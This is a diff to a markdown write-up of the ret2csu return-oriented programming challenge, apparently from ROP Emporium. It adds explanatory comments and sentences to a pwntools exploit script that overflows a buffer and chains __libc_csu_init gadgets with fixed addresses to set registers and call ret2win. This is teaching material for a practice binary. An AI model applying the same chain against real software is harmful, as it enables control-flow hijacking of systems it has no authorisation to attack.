@@ -200,6 +200,8 @@ payload += p64(0xd00df00dd00df00d) # r15 -> rdx
 payload += p64(0x00400680)         # mov rdx, r15; mov rsi, r14, mov edi, r13d; call qword [r12 + rbx*8]
 ```
 
+Gadget 1 sets up some registers, then returns to gadget 2.
+
 %rbx must be zero and %r12 point to the pointer to `_init`'s address, so that
 the call using `%r12+%rbx*8` will end up as the value from %r12.
 
@@ -210,10 +212,10 @@ Subsequently, the values in %rbx and %rbp are compared.
 To take our prefered control flow, we need both values to be the same.
 For this reason we pop `0x01` into %rbp (see gadget 1 above).
 
-On to gadget 2:
-
 By this point we already have the right values for %rsi and %rdx, but we're
 still missing %rdi.
+
+Gadget 2 falls back into the pop-slide of gadget 1.
 
 We pop past the pop-slide, return to the `pop rdi; ret` gadget, and make our
 final return to `ret2win@plt`.
@@ -289,6 +291,7 @@ RIP_OFFSET = 40
 
 payload  = b'A'*RIP_OFFSET
 
+# ** gadget 1:
 payload += p64(0x0040069a) # rbx, rbp, r12, r13, r14, r15
 payload += p64(0x00) # rbx
 payload += p64(0x01) # rbp
@@ -296,17 +299,21 @@ payload += p64(0x600398) # r12: _init function
 payload += p64(0xFF) # r13
 payload += p64(0xcafebabecafebabe) # r14 -> rsi
 payload += p64(0xd00df00dd00df00d) # r15 -> rdx
+# ** gadget 2:
 payload += p64(0x00400680) # mov rdx, r15; mov rsi, r14, mov edi, r13d; call qword [r12 + rbx*8]
 # call happens here
 payload += p64(0xFF) # add rsp,0x8 (removes this value from the stack)
+# ** falls back into gadget 1:
 payload += p64(0xFF) # rbx
 payload += p64(0xFF) # rbp
 payload += p64(0xFF) # r12
 payload += p64(0xFF) # r13
 payload += p64(0xFF) # r14
 payload += p64(0xFF) # r15
+# ** fix up %rdi
 payload += p64(rop.rdi.address) # pop rdi; ret
 payload += p64(0xdeadbeefdeadbeef) # rdi
+# ** call target function
 payload += p64(elf.plt['ret2win'])
 
 p.sendline(payload)
